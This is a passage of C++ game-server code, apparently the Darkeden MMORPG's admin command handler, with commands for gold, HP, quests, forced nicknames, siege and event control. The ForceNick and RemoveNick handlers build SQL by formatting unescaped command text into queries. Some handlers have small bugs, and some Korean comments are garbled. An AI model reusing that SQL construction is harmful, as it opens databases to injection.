        Slayer *pSlayer = dynamic_cast<Slayer *>(pCreature);
        pSlayer->setGoldEx(gold);

        gcMI.addLongData(MODIFY_GOLD, pSlayer->getGold());
      } else if (pCreature->isVampire()) {
        Vampire *pVampire = dynamic_cast<Vampire *>(pCreature);
        pVampire->setGoldEx(gold);

        gcMI.addLongData(MODIFY_GOLD, pVampire->getGold());
      } else if (pCreature->isOusters()) {
        Ousters *pOusters = dynamic_cast<Ousters *>(pCreature);
        pOusters->setGoldEx(gold);

        gcMI.addLongData(MODIFY_GOLD, pOusters->getGold());
      }

      pGamePlayer->sendPacket(&gcMI);
    }

    // If it's an amount worth logging, I'll log it.
    if (gold >= g_pVariableManager->getMoneyTraceLogLimit()) {
      if (gold > 2000000000)
        gold = 2000000000;

      remainMoneyTraceLog("GOD", pCreature->getName(), ITEM_LOG_CREATE,
                          DETAIL_COMMAND, gold);
    }

    bSendPacket = false;
  } else if (command == "Quest") {
    Creature *pCreature = pGamePlayer->getCreature();
    PlayerCreature *pPC = dynamic_cast<PlayerCreature *>(pCreature);

    if (pPC != NULL && value1 == "Complete") {
      QuestManager *pQM = pPC->getQuestManager();
      if (pQM != NULL) {
        MonsterKillQuestStatus *pQS = dynamic_cast<MonsterKillQuestStatus *>(
            pQM->getQuestStatusByQuestClass(QUEST_CLASS_MONSTER_KILL));
        if (pQS != NULL) {
          pQS->completeQuest();
          pPC->sendCurrentQuestInfo();

          bSendPacket = false;
        }
      }
    }
  } else if (command == "QuestEnding") {
    GCNoticeEvent gcNoticeEvent;
    gcNoticeEvent.setCode(NOTICE_EVENT_START_QUEST_ENDING);

    pGamePlayer->sendPacket(&gcNoticeEvent);
    bSendPacket = false;
  } else if (command == "NotifyWin") {
    int j = value1.find_first_of(' ', 0);
    string name = value1.substr(0, j);
    int giftID = atoi(trim(value1.substr(j + 1, value1.size())).c_str());

    GCNotifyWin gcNW;
    gcNW.setGiftID(giftID);
    gcNW.setName(name);

    g_pZoneGroupManager->pushBroadcastPacket(&gcNW);
    bSendPacket = false;
  } else if (command == "Horn") {
    GCNoticeEvent gcNE;
    gcNE.setCode(NOTICE_EVENT_RUN_HORN);

    pGamePlayer->sendPacket(&gcNE);
    bSendPacket = false;
  } else if (command == "Loud") {
    Creature *pCreature = pGamePlayer->getCreature();

    int j = value1.find_first_of(' ', 0);
    string name = value1.substr(0, j);
    int time = atoi(trim(value1.substr(j + 1, value1.size())).c_str());

    Effect *pEffect = NULL;
    if (pCreature->isFlag(Effect::EFFECT_CLASS_LOUD)) {
      pEffect = pCreature->findEffect(Effect::EFFECT_CLASS_LOUD);

      pEffect->setDeadline(time * 10);
    } else {
      pEffect = new EffectLoud(pCreature);
      pEffect->setDeadline(time * 10);
      pCreature->addEffect(pEffect);
      pCreature->setFlag(pEffect->getEffectClass());
    }

    GCAddEffect gcAddEffect;
    gcAddEffect.setObjectID(pCreature->getObjectID());
    gcAddEffect.setEffectID(pEffect->getSendEffectClass());
    gcAddEffect.setDuration(time * 10);

    pCreature->getZone()->broadcastPacket(pCreature->getX(), pCreature->getY(),
                                          &gcAddEffect, pCreature);
    pGamePlayer->sendPacket(&gcAddEffect);

    bSendPacket = false;
  } else if (command == "Game") {
    int j = value1.find_first_of(' ', 0);
    string name = value1.substr(0, j);

    GCNoticeEvent gcNE;
    gcNE.setCode(NOTICE_EVENT_MINI_GAME);

    if (name == "Mine") {
      gcNE.setParameter(0);
    } else if (name == "Nemo") {
      gcNE.setParameter(1);
    } else if (name == "Push") {
      gcNE.setParameter(2);
    } else if (name == "Mine") {
      gcNE.setParameter(3);
    } else if (name == "Arrow") {
      gcNE.setParameter(4);
    } else {
      gcNE.setParameter(atoi(name.c_str()));
    }

    /*		if ( gcNE.getParameter() < 3 )
                    {
                            pGamePlayer->sendPacket(&gcNE);

                            GCMiniGameScores gcScores;
                            gcScores.setGameType( (GameType)gcNE.getParameter()
       );

                            Statement* pStmt = NULL;

                            BEGIN_DB
                            {
                                    pStmt =
       g_pDatabaseManager->getConnection("DARKEDEN")->createStatement(); Result*
       pResult = pStmt->executeQuery( "SELECT Name, Score FROM MiniGameScores
       WHERE Type = %u ORDER BY Score limit 10",gcScores.getGameType() );

                                    int i=0;

                                    if (pResult->next())
                                    {
                                            string name = pResult->getString(1);
                                            WORD score =
       (WORD)pResult->getInt(2);

                                            gcScores.setScore(i,name,score);
                                            i++;
                                    }

                                    SAFE_DELETE(pStmt);
                            }
                            END_DB(pStmt)

                            pGamePlayer->sendPacket(&gcScores);
                            bSendPacket = false;
                    } */
  } else if (command == "changeSex") {
    Creature *pCreature = pGamePlayer->getCreature();
    PlayerCreature *pPC = dynamic_cast<PlayerCreature *>(pCreature);

    if (pPC != NULL) {
      if (changeSexEx(pPC))
        bSendPacket = false;
    }
  }
  /*	else if ( command == "createBulletin" )
          {
                  int bulletinLevel = atoi( value1.c_str() );

                  string createMessage = "*create EventTree ";
                  switch (bulletinLevel)
                  {
                          case 1:
                                  createMessage = createMessage + "26";
                                  break;
                          case 2:
                                  createMessage = createMessage + "27";
                                  break;
                          case 3:
                                  createMessage = createMessage + "28";
                                  break;
                          default:
                                  createMessage = createMessage + "26";
                                  break;
                  }
                  opcreate(pGamePlayer, createMessage, 0);
                  bSendPacket = false;
          }
          else if ( command == "createFirecraker" )
          {
                  string createMessage = "*create EventETC " + value1;
                  opcreate(pGamePlayer, createMessage, 0);
                  bSendPacket = false;
          } */
  else if (command == "Firecraker") {
    Creature *pCreature = pGamePlayer->getCreature();
    if (pCreature != NULL) {
      Zone *pZone = pCreature->getZone();

      if (!isAbleToUseTileSkill(pCreature) ||
          (pZone->getZoneLevel(pCreature->getX(), pCreature->getY()) &
           COMPLETE_SAFE_ZONE) ||
          atoi(value1.c_str()) < 0 || atoi(value1.c_str()) > 13) {
        //Hmm -_-a
      } else {
        Effect::EffectClass effectClass =
            FirecrackerEffects[atoi(value1.c_str())];
        // Create an effect and broadcast it.
        GCAddEffectToTile gcAddEffectToTile;
        gcAddEffectToTile.setObjectID(pCreature->getObjectID());
        gcAddEffectToTile.setEffectID(effectClass);
        gcAddEffectToTile.setXY(pCreature->getX(), pCreature->getY());
        gcAddEffectToTile.setDuration(10); // It doesn't really mean anything—just a second

        pZone->broadcastPacket(pCreature->getX(), pCreature->getY(),
                               &gcAddEffectToTile);
        bSendPacket = false;
      }
    }
  } else if (command == "Bulletin") {
    Creature *pCreature = pGamePlayer->getCreature();
    if (pCreature != NULL) {
      Zone *pZone = pCreature->getZone();

      size_t l = value1.find_first_of(' ', 0);

      int bulletinLevel = atoi(value1.substr(0, l).c_str());
      string bulletinMessage = value1.substr(l + 1, value1.size() - l - 1) +
                               "%" + pCreature->getName();

      MonsterType_t MType = 0;
      int time = 0;

      switch (bulletinLevel) {
        //				case 0:
        //					MType = 482;
        //					time =
        //g_pVariableManager->getVariable( CHRISTMAS_TREE_DECAY_TIME ) / 10;
        //					break;
      case 1:
        MType = 650;
        time = 21600;
        break;
      case 2:
        MType = 650;
        time = 43200;
        break;
      case 3:
        MType = 650;
        time = 86400;
        break;
      default:
        break;
      }

      if (MType != 0 && l <= value1.size()) {
        if (createBulletinBoard(pZone, pCreature->getX(), pCreature->getY(),
                                MType, bulletinMessage,
                                VSDateTime::currentDateTime().addSecs(time))) {
          bSendPacket = false;
        }
      }
    }
  } else if (command == "SetHP") {
    Creature *pCreature = pGamePlayer->getCreature();
    if (pCreature != NULL) {
      Zone *pZone = pCreature->getZone();

      HP_t hp = (HP_t)atoi(value1.c_str());
      if (pCreature->isSlayer()) {
        dynamic_cast<Slayer *>(pCreature)->setHP(hp);
      } else if (pCreature->isVampire()) {
        dynamic_cast<Vampire *>(pCreature)->setHP(hp);
      } else if (pCreature->isOusters()) {
        dynamic_cast<Ousters *>(pCreature)->setHP(hp);
      }

      GCStatusCurrentHP gcHP;
      gcHP.setObjectID(pCreature->getObjectID());
      gcHP.setCurrentHP(hp);

      pZone->broadcastPacket(pCreature->getX(), pCreature->getY(), &gcHP);
      bSendPacket = false;
    }
  } else if (command == "ResetAttr") {
    Creature *pCreature = pGamePlayer->getCreature();
    char buffer[100];

    if (pCreature != NULL) {
      if (pCreature->isSlayer()) {
        gcSystemMessage.setMessage(
            "Slayer does not support resetting stats.");
      } else if (pCreature->isVampire()) {
        Vampire *pVampire = dynamic_cast<Vampire *>(pCreature);
        if (pVampire != NULL)
          ;
        {
          VAMPIRE_RECORD prev;
          pVampire->getVampireRecord(prev);

          pVampire->setSTR(20, ATTR_BASIC);
          pVampire->setDEX(20, ATTR_BASIC);
          pVampire->setINT(20, ATTR_BASIC);

          pVampire->setBonus(3 * (pVampire->getLevel() - 1));

          pVampire->initAllStat();
          pVampire->sendModifyInfo(prev);

          sprintf(buffer, "STR=20, DEX=20, INTE=20, Bonus=%d",
                  pVampire->getBonus());
          pVampire->tinysave(buffer);
        }
      } else if (pCreature->isOusters()) {
        Ousters *pOusters = dynamic_cast<Ousters *>(pCreature);
        if (pOusters != NULL)
          ;
        {
          OUSTERS_RECORD prev;
          pOusters->getOustersRecord(prev);

          pOusters->setSTR(10, ATTR_BASIC);
          pOusters->setDEX(10, ATTR_BASIC);
          pOusters->setINT(10, ATTR_BASIC);

          pOusters->setBonus(3 * (pOusters->getLevel() - 1) + 15);

          pOusters->initAllStat();
          pOusters->sendModifyInfo(prev);

          sprintf(buffer, "STR=10, DEX=10, INTE=10, Bonus=%d",
                  pOusters->getBonus());
          pOusters->tinysave(buffer);
        }
      }
    }
  } else if (command == "CTF" || command == "startFlagWar") {
    // 2026-05-09: startFlagWar alias eklendi (CTF ile aynisi).
    // Kullanim: *command startFlagWar    (DM/GOD)
    //          *command CTF              (eski isim, backward compat)
    // Etki: aktif schedule yoksa hemen yeni FlagWar event acar,
    //       varsa en yakin zamanlanmis olani simdi tetikler.
    g_pFlagManager->manualStart();
    gcSystemMessage.setMessage("FlagWar (CTF) manually triggered.");

    filelog("admin.log", "FlagWar manualStart by %s",
            (pGamePlayer != NULL && pGamePlayer->getCreature() != NULL)
                ? pGamePlayer->getCreature()->getName().c_str()
                : "<unknown>");
  } else if (command == "startAOS" || command == "startAOSTest" ||
             command == "startMobaTest") {
    PlayerCreature *pPC =
        dynamic_cast<PlayerCreature *>(pGamePlayer->getCreature());
    string resultMessage;

    if (DynamicZoneMoba::StartTestMatch(pPC, &resultMessage)) {
      gcSystemMessage.setMessage(resultMessage);
    } else {
      if (resultMessage.empty())
        resultMessage = "AOS Battle test failed.";
      gcSystemMessage.setMessage(resultMessage);
    }

    filelog("admin.log", "AOS Battle test command=%s caller=%s result=%s",
            command.c_str(),
            (pGamePlayer != NULL && pGamePlayer->getCreature() != NULL)
                ? pGamePlayer->getCreature()->getName().c_str()
                : "<unknown>",
            resultMessage.c_str());
  } else if (command == "endFlagWar") {
    // 2026-05-09: aktif FlagWar'i zamanindan once bitir.
    // Kullanim: *command endFlagWar    (DM/GOD)
    // Etki: hasFlagWar() true ise endFlagWar() cagrilir, finish state'e
    //       gecirir; degilse no-op + system message.
    if (g_pFlagManager->hasFlagWar()) {
      g_pFlagManager->endFlagWar();
      gcSystemMessage.setMessage("Active FlagWar ended.");

      filelog("admin.log", "FlagWar endFlagWar by %s",
              (pGamePlayer != NULL && pGamePlayer->getCreature() != NULL)
                  ? pGamePlayer->getCreature()->getName().c_str()
                  : "<unknown>");
    } else {
      gcSystemMessage.setMessage("No active FlagWar to end.");
    }
  } else if (command == "ViewDamage") {
    Creature *pCreature = pGamePlayer->getCreature();
    Assert(pCreature != NULL);

    bool bViewDamage = pCreature->isFlag(Effect::EFFECT_CLASS_VIEW_HP);

    if (value1 == "on") {
      if (!bViewDamage) {
        addSimpleCreatureEffect(pCreature, Effect::EFFECT_CLASS_VIEW_HP, -1,
                                false);

        GCAddEffect gcAddEffect;
        gcAddEffect.setObjectID(pCreature->getObjectID());
        gcAddEffect.setEffectID(Effect::EFFECT_CLASS_VIEW_HP);
        gcAddEffect.setDuration(65535);

        pGamePlayer->sendPacket(&gcAddEffect);
      }
    } else if (value1 == "off") {
      if (bViewDamage) {
        Effect *pEffect = pCreature->findEffect(Effect::EFFECT_CLASS_VIEW_HP);
        if (pEffect != NULL)
          pEffect->setDeadline(0);
      }
    }
  } else if (command == "GoodsReload") {
    PlayerCreature *pPC =
        dynamic_cast<PlayerCreature *>(pGamePlayer->getCreature());
    if (pPC != NULL) {
      pPC->loadGoods();
      pPC->registerGoodsInventory(pPC->getZone()->getObjectRegistry());
      gcSystemMessage.setMessage("Goods relading..");
    }
  } else if (command == "PetStash") {
    PlayerCreature *pPC =
        dynamic_cast<PlayerCreature *>(pGamePlayer->getCreature());
    if (pPC != NULL) {
      GCPetStashList gcPetStashList;
      makeGCPetStashList(&gcPetStashList, pPC);

      gcPetStashList.setCode(0);
      pGamePlayer->sendPacket(&gcPetStashList);
      bSendPacket = false;
    }
  } else if (command == "ZoneEvent") {
    Creature *pCreature = pGamePlayer->getCreature();
    EventZoneInfo *pEventZoneInfo =
        EventZoneInfoManager::Instance().getEventZoneInfo(
            pCreature->getZone()->getZoneID());
    if (pEventZoneInfo == NULL) {
      gcSystemMessage.setMessage("This is not the event zone.");
    } else if (value1 == "on") {
      WORD EventID = pEventZoneInfo->getEventID();
      ZoneEventInfo *pZoneEventInfo =
          EventZoneInfoManager::Instance().getZoneEventInfo(EventID);
      EventZoneInfo *pCurrentEventZoneInfo =
          pZoneEventInfo->getCurrentEventZoneInfo();

      if (pCurrentEventZoneInfo != NULL &&
          pCurrentEventZoneInfo != pEventZoneInfo) {
        gcSystemMessage.setMessage("Another event is already active.");
      } else if (pCurrentEventZoneInfo == NULL) {
        pEventZoneInfo->turnOn();
        gcSystemMessage.setMessage("Turned event on.");
      } else
        gcSystemMessage.setMessage("The event is already turned on.");
    } else if (value1 == "off") {
      if (pEventZoneInfo->isEventOn()) {
        pEventZoneInfo->turnOff();
        gcSystemMessage.setMessage("Turned event off.");
      } else
        gcSystemMessage.setMessage("The event is not enabled.");
    }
  } else if (command == "EventZonePCLimit") {
    Creature *pCreature = pGamePlayer->getCreature();
    EventZoneInfo *pEventZoneInfo =
        EventZoneInfoManager::Instance().getEventZoneInfo(
            pCreature->getZone()->getZoneID());
    if (pEventZoneInfo == NULL) {
      gcSystemMessage.setMessage("This is not the event zone.");
    } else {
      WORD lim = (WORD)atoi(value1.c_str());
      pEventZoneInfo->setPCLimit(lim);
      char buffer[100];
      sprintf(buffer, "Capacity limit : %u", lim);
      gcSystemMessage.setMessage(buffer);
    }
  } else if (command == "KickOutAll") {
    Creature *pCreature = pGamePlayer->getCreature();
    PCManager *pPCManager = (PCManager *)pCreature->getZone()->getPCManager();
    pPCManager->transportAllCreatures(1303, 46, 49);
    gcSystemMessage.setMessage("Banned all users.");
  } else if (command == "StartTrap") {
    Creature *pCreature = pGamePlayer->getCreature();
    if (pCreature->getZoneID() == 1410) {
      Zone *pZone = pCreature->getZone();

      EffectCastingIcicleTrap *pEffect =
          new EffectCastingIcicleTrap(Effect::EFFECT_CLASS_ICICLE_DROP, pZone);
      pZone->registerObject(pEffect);

      pEffect->setStartXY(116, 66);
      pEffect->setLength(48);
      pEffect->setTick(5);
      pEffect->setUnit(10);
      pEffect->setDir(7);
      pEffect->setNextTime(0);
      pEffect->setDeadline(6000);
      pZone->addEffect(pEffect);

      {
        EffectCastingIceWall *pEffect = new EffectCastingIceWall(pZone);

        pEffect->setStartXY(63, 19);
        pEffect->setLength(48);
        pEffect->setWallLength(5);
        pEffect->setTick(15);
        pEffect->setDir(1);
        pEffect->setNextTime(0);
        pEffect->setDeadline(6000);
        pZone->addEffect(pEffect);
      }

      pEffect = new EffectCastingIcicleTrap(
          Effect::EFFECT_CLASS_ICICLE_AUGER_LARGE, pZone);

      pEffect->setStartXY(15, 72);
      pEffect->setLength(47);
      pEffect->setTick(10);
      pEffect->setUnit(15);
      pEffect->setDir(3);
      pEffect->setLarge(true);
      pEffect->setNextTime(0);
      pEffect->setDeadline(6000);
      pZone->addEffect(pEffect);

      {
        EffectCastingSideTrap *pEffect = new EffectCastingSideTrap(pZone);

        pEffect->setStartXY(68, 119);
        pEffect->setLength(27);
        pEffect->setTick(10);
        pEffect->setUnit(5);
        pEffect->setDir(5);
        pEffect->setNextTime(0);
        pEffect->setDeadline(6000);
        pZone->addEffect(pEffect);
      }

      gcSystemMessage.setMessage("I set a trap.");
    } else {
      gcSystemMessage.setMessage("This is not a zone where you can set traps.");
    }

  } else if (command == "SMSTest") {
    GCNoticeEvent gcNE;
    gcNE.setCode(NOTICE_EVENT_SEND_SMS);
    pGamePlayer->sendPacket(&gcNE);
  } else if (command == "ForceNick") {
    int j = value1.find_first_of(' ', 0);
    string name = trim(value1.substr(0, j));
    string nick = trim(value1.substr(j + 1, value1.size()));

    cout << "ForceNick " << name << " : " << nick << endl;
    ;

    Creature *pTargetCreature;
    Creature *pCreature = pGamePlayer->getCreature();

    __ENTER_CRITICAL_SECTION((*g_pPCFinder))

    pTargetCreature = g_pPCFinder->getCreature_LOCKED(name);

    __LEAVE_CRITICAL_SECTION((*g_pPCFinder))

    if (pTargetCreature == NULL ||
        pTargetCreature->getZone() != pCreature->getZone() ||
        !pTargetCreature->isPC()) {
      gcSystemMessage.setMessage("Cannot find that character in this zone.");
    } else {
      PlayerCreature *pPC = dynamic_cast<PlayerCreature *>(pTargetCreature);
      Statement *pStmt;

      BEGIN_DB {
        pStmt =
            g_pDatabaseManager->getConnection("DARKEDEN")->createStatement();
        pStmt->executeQuery("REPLACE INTO NicknameBook (nID, OwnerID, "
                            "NickType, Nickname, NickIndex, Time) VALUES "
                            "(100, '%s', %u, '%s', 0, now())",
                            pPC->getName().c_str(),
                            NicknameInfo::NICK_CUSTOM_FORCED, nick.c_str());
        SAFE_DELETE(pStmt);
      }
      END_DB(pStmt)

      NicknameBook *pNickbook = pPC->getNicknameBook();
      NicknameInfo *pNick = pNickbook->getNicknameInfo(100);
      SAFE_DELETE(pNick);

      pNick = new NicknameInfo;
      pNick->setNicknameID(100);
      pNick->setNicknameType(NicknameInfo::NICK_CUSTOM_FORCED);
      pNick->setNickname(nick);
      pNickbook->setNicknameInfo(100, pNick);

      pPC->setNickname(pNick);
      GCModifyNickname gcMN;
      gcMN.setObjectID(pPC->getObjectID());
      gcMN.setNicknameInfo(pNick);

      pPC->getZone()->broadcastPacket(pPC->getX(), pPC->getY(), &gcMN);
      Packet *pPacket = pNickbook->getNicknameBookListPacket();
      pPC->getPlayer()->sendPacket(pPacket);
      SAFE_DELETE(pPacket);
    }
  } else if (command == "RemoveNick") {
    string name = trim(value1);
    cout << "RemoveNick " << name << endl;

    Creature *pTargetCreature;
    Creature *pCreature = pGamePlayer->getCreature();

    __ENTER_CRITICAL_SECTION((*g_pPCFinder))

    pTargetCreature = g_pPCFinder->getCreature_LOCKED(name);

    __LEAVE_CRITICAL_SECTION((*g_pPCFinder))

    if (pTargetCreature == NULL ||
        pTargetCreature->getZone() != pCreature->getZone() ||
        !pTargetCreature->isPC()) {
      gcSystemMessage.setMessage("Cannot find that character in this zone.");
    } else {
      PlayerCreature *pPC = dynamic_cast<PlayerCreature *>(pTargetCreature);

      NicknameBook *pNickbook = pPC->getNicknameBook();
      NicknameInfo *pNick = pNickbook->getNicknameInfo(100);

      if (pNick == NULL) {
        gcSystemMessage.setMessage("There is no option to delete.");
      } else {
        Statement *pStmt;

        BEGIN_DB {
          pStmt =
              g_pDatabaseManager->getConnection("DARKEDEN")->createStatement();
          pStmt->executeQuery(
              "DELETE FROM NicknameBook WHERE OwnerID='%s' AND nID=100",
              pPC->getName().c_str());
          SAFE_DELETE(pStmt);
        }
        END_DB(pStmt)

        if (pPC->getNickname() == pNick) {
          pPC->setNickname(NULL);
          GCModifyNickname gcMN;
          gcMN.setObjectID(pPC->getObjectID());

          NicknameInfo noNick;
          noNick.setNicknameType(NicknameInfo::NICK_NONE);
          gcMN.setNicknameInfo(&noNick);

          pPC->getZone()->broadcastPacket(pPC->getX(), pPC->getY(), &gcMN);
        }

        pNickbook->setNicknameInfo(100, NULL);
        SAFE_DELETE(pNick);

        Packet *pPacket = pNickbook->getNicknameBookListPacket();
        pPC->getPlayer()->sendPacket(pPacket);
        SAFE_DELETE(pPacket);
      }
    }
  } else if (command == "StartGDRLair") {
    if (GDRLairManager::Instance().getCurrentState() == GDR_LAIR_IDLE) {
      GDRLairIdle *pState = dynamic_cast<GDRLairIdle *>(
          GDRLairManager::Instance().getCurrentState_Object());
      if (pState != NULL) {
        pState->expire();
        gcSystemMessage.setMessage("Start the GDR Lair");
      }
    } else if (GDRLairManager::Instance().getCurrentState() ==
               GDR_LAIR_ENTRANCE) {
      GDRLairEntrance *pState = dynamic_cast<GDRLairEntrance *>(
          GDRLairManager::Instance().getCurrentState_Object());
      if (pState != NULL) {
        pState->expire();
        gcSystemMessage.setMessage("Open the GDR Lair");
      }
    }
  } else if (command == "ResetGDRLair") {
    if (GDRLairManager::Instance().getCurrentState() != GDR_LAIR_IDLE) {
      GDRLairManager::Instance().reset();
      gcSystemMessage.setMessage("Resetting the GDR Lair");
    }
  } else if (command == "GuildRecall" && pGamePlayer != NULL) {
    Creature *pCreature = pGamePlayer->getCreature();
    Assert(pCreature != NULL);

    int j = value1.find_first_of(' ', 0);
    int k = value1.find_first_of(' ', j + 1);

    if (k == string::npos)
      k = value1.size();
    GuildID_t gid = atoi(trim(value1.substr(0, j)).c_str());
    int num = atoi(trim(value1.substr(j + 1, k)).c_str());
    int side = 0;

    if (k != value1.size()) {
      string sidestr = trim(value1.substr(k + 1, value1.size()));
      side = atoi(sidestr.c_str());
      if (side == 0) {
        if (sidestr == "defense") {
          side = 1;
        } else if (sidestr == "reinforce") {
          side = 2;
        } else if (sidestr == "attack1") {
          side = 3;
        } else if (sidestr == "attack2") {
          side = 4;
        } else if (sidestr == "attack3") {
          side = 5;
        } else if (sidestr == "attack4") {
          side = 6;
        } else if (sidestr == "attack5") {
          side = 7;
        }
      }
    }

    __ENTER_CRITICAL_SECTION((*g_pPCFinder))

    list<Creature *> clist = g_pPCFinder->getGuildCreatures(gid, 200);

    for (list<Creature *>::const_iterator itr = clist.begin();
         itr != clist.end(); ++itr) {
      Creature *pTargetCreature = *itr;
      if (pTargetCreature == NULL)
        continue;

      //  존과 �.
      ZoneID_t ZoneNum = pCreature->getZoneID();
      Coord_t ZoneX = pCreature->getX();
      Coord_t ZoneY = pCreature->getY();

      if (pCreature->getZoneID() != pTargetCreature->getZoneID()) {
        pTargetCreature->getZone()->lock();
      }

      for (int i = 0; i < 7; ++i) {
        deleteCreatureEffect(
            pTargetCreature,
            (Effect::EffectClass)(Effect::EFFECT_CLASS_SIEGE_DEFENDER + i));
      }

      if (side < 8 && side > 0) {
        cout << "side : " << side << endl;
        addSimpleCreatureEffect(
            pTargetCreature,
            (Effect::EffectClass)(Effect::EFFECT_CLASS_SIEGE_DEFENDER + side -
                                  1));
      }

      if (pCreature->getZoneID() != pTargetCreature->getZoneID()) {
        pTargetCreature->getZone()->unlock();
      }

      transportCreature(pTargetCreature, ZoneNum, ZoneX, ZoneY, false);
      num--;
      if (num <= 0)
        break;
    }

    __LEAVE_CRITICAL_SECTION((*g_pPCFinder))
  } else if (command == "ResetSiege") {
    SiegeManager::Instance().reset(pGamePlayer->getCreature()->getZoneID());
  } else if (command == "InitSiege") {
    SiegeManager::Instance().start(pGamePlayer->getCreature()->getZoneID());
  }
  // by viva
  /*	else if ( command == "ReloadAuthTable" )
          {
                  LoadAuthTable( (g_pConfig->getProperty("HomePath") +
     "/data/CSAuth.tab").c_str() ); LoadAuthIndex(
     (g_pConfig->getProperty("HomePath") + "/data/CSAuth.idx").c_str() );
                  gcSystemMessage.setMessage("� �� �� ��
     롵�.");
          }
          else if ( command == "SetAuthIndex" )
          {
                  DWORD index = atoi(trim(value1).c_str());
                  SetAuthIndex(index);
                  char buffer[100];
                  sprintf(buffer, "� �� ���� %u�
     ����.", index); gcSystemMessage.setMessage( buffer );
          }*/
  else if (command == "IAmAttacker") {
    Creature *pCreature = pGamePlayer->getCreature();
    Assert(pCreature != NULL);

    addSimpleCreatureEffect(pCreature, Effect::EFFECT_CLASS_SIEGE_ATTACKER_1,
                            600);
    gcSystemMessage.setMessage("You will transform and become the first Attacker unit in the siege for 1 minute.");
  } else if (command == "IAmDefender") {
    Creature *pCreature = pGamePlayer->getCreature();
    Assert(pCreature != NULL);

    addSimpleCreatureEffect(pCreature, Effect::EFFECT_CLASS_SIEGE_DEFENDER,
                            600);
    gcSystemMessage.setMessage("You will transform and become the first Defender unit in the siege for 1 minute.");
  } else if (command == "IAmReinforce") {
    Creature *pCreature = pGamePlayer->getCreature();
    Assert(pCreature != NULL);

    addSimpleCreatureEffect(pCreature, Effect::EFFECT_CLASS_SIEGE_REINFORCE,
                            600);
    gcSystemMessage.setMessage("You will transform and become the first Reinforcer unit in the siege for 1 minute.");
  } else if (command == "showpcstat") {
    Creature *pCreature = pGamePlayer->getCreature();
    Assert(pCreature != NULL);
    vector<uint> num = pCreature->getZone()->getPCManager()->getPCNumByRace();
    char buffer[200];
    sprintf(buffer, "%u Slayers, %u Vampires, %u Ousters",
            num[RACE_SLAYER], num[RACE_VAMPIRE], num[RACE_OUSTERS]);
    gcSystemMessage.setMessage(buffer);
  } else if (command == "advanceclass") {
    PlayerCreature *pPC =
        dynamic_cast<PlayerCreature *>(pGamePlayer->getCreature());
    Assert(pPC != NULL);

    pPC->increaseAdvancementClassExp(1);
    GCModifyInformation gcMI;
    gcMI.addShortData(MODIFY_ADVANCEMENT_CLASS_LEVEL,
                      pPC->getAdvancementClassLevel());
    pGamePlayer->sendPacket(&gcMI);
  } else if (command == "addDynamicZone") {
    int DynamicZoneType = atoi(trim(value1).c_str());

    DynamicZone *pDynamicZone =
        g_pDynamicZoneManager->getDynamicZoneGroup(DynamicZoneType)
            ->getAvailableDynamicZone();

    char zoneID[32];
    sprintf(zoneID, "%u - %u", pDynamicZone->getTemplateZoneID(),
            pDynamicZone->getZoneID());

    gcSystemMessage.setMessage(zoneID);
  } else if (command == "enterDynamicZone") {
    ZoneID_t DynamicZoneType = atoi(trim(value1).c_str());

    PlayerCreature *pPC =
        dynamic_cast<PlayerCreature *>(pGamePlayer->getCreature());
    Assert(pPC != NULL);

    pPC->getGQuestManager()->enterDynamicZone(DynamicZoneType);
  } else if (command == "clearDynamicZone") {
    ZoneID_t DynamicZoneType = atoi(trim(value1).c_str());

    PlayerCreature *pPC =
        dynamic_cast<PlayerCreature *>(pGamePlayer->getCreature());
    Assert(pPC != NULL);

    pPC->getGQuestManager()->clearDynamicZone(DynamicZoneType);
  } else if (command == "setTimeOutAllZoneEffect") {
    Creature *pCreature = pGamePlayer->getCreature();
    Assert(pCreature != NULL);
    pCreature->getZone()->getEffectManager()->setTimeOutAllEffect();
    gcSystemMessage.setMessage("How to Time Out All Zones");
  } else if (command == "printTile") {
    Zone *pZone = pGamePlayer->getCreature()->getZone();

    for (int y = 0; y < pZone->getHeight(); ++y) {
      for (int x = 0; x < pZone->getWidth(); ++x) {
        if (pZone->getTile(x, y).getEffect(Effect::EFFECT_CLASS_DELETE_TILE) !=
            NULL) {
          cout << "#";
        } else {
          cout << ".";
        }
      }
      cout << endl;
    }
  } else if (command == "BloodBurst") {
    PlayerCreature *pPC =
        dynamic_cast<PlayerCreature *>(pGamePlayer->getCreature());
    Assert(pPC != NULL);

    pPC->setAttackBloodBurstPoint(ATTACK_BLOOD_BURST_POINT_MAX);
    pPC->setDefenseBloodBurstPoint(DEFENSE_BLOOD_BURST_POINT_MAX);

    if (pPC->getPartyID() != 0) {
      LocalPartyManager *pLPM = pPC->getLocalPartyManager();

      if (pLPM != NULL) {
        Party *pLocalParty = pLPM->getParty(pPC->getPartyID());
        Party *pGlobalParty =
            g_pGlobalPartyManager->getParty(pPC->getPartyID());

        if (pLocalParty != NULL && pGlobalParty != NULL &&
            pLocalParty->getSize() == pGlobalParty->getSize()) {
          // If the number of members in LocalParty is equal to the number of members in GlobalParty,
          g_pGlobalPartyManager->increasePartyBloodBurstPoint(
              pPC->getPartyID(), PARTY_BLOOD_BURST_POINT_MAX);
        }
      }
    }

    GCModifyInformation gcMI;
    gcMI.addShortData(MODIFY_ATTACK_BLOOD_BURST_POINT,
                      pPC->getAttackBloodBurstPoint());
    gcMI.addShortData(MODIFY_DEFENSE_BLOOD_BURST_POINT,
                      pPC->getDefenseBloodBurstPoint());

    pGamePlayer->sendPacket(&gcMI);

    bSendPacket = false;
  } else if (command == "resetStateTime") {
    Zone *pZone = pGamePlayer->getCreature()->getZone();
    if (pZone->isMikllizzLair()) {
      pZone->getMikllizzLairManager()->resetStateTime();

      gcSystemMessage.setMessage("reset state time");
    } else {
      gcSystemMessage.setMessage("Not in Mikllizz Lair");
    }

    bSendPacket = true;
  } else if (command == "startSurvival") {
    Zone *pZone = pGamePlayer->getCreature()->getZone();
    if (pZone->isSurvivalZone() && pZone->getZoneID() == 8001) {
      pZone->getEventSurvivalZoneManager()->setRaceSurvival(false);
      pZone->getEventSurvivalZoneManager()->startEvent();

      gcSystemMessage.setMessage("Open Survival Zone");
    } else {
      gcSystemMessage.setMessage("Not in Survival Zone");
    }
  } else if (command == "startRaceSurvival") {
    Zone *pZone = pGamePlayer->getCreature()->getZone();
    Race_t race = (Race_t)atoi(value1.c_str());

    if (pZone->isSurvivalZone() && pZone->getZoneID() == 8001 &&
        (value1 == "SLAYER" || value1 == "VAMPIRE" || value1 == "OUSTERS")) {
      if (value1 == "SLAYER") {
        race = 0;
      } else if (value1 == "VAMPIRE") {
        race = 1;
      } else if (value1 == "OUSTERS") {
        race = 2;
      }

      pZone->getEventSurvivalZoneManager()->setRaceSurvival(true);
